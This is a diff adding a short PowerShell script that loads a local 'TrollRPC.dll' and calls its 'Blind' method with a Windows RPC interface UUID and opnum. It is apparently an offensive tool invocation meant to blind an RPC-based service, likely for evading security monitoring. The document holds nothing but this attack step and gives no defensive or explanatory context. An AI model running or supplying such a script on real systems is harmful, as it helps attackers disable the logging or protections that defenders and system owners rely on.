@@ -1,0 +1,5 @@
+[System.Reflection.Assembly]::LoadFile("C:\Users\deny.febriyanto\TrollRPC.dll") 
+$uuid_gen = "c503f532-443a-4c69-8300-ccd1fbdb3839"
+$opn = 0x5E
+$opn_break = 0x00
+[TrollRPC]::Blind($uuid_gen, $opn, $opn_break)
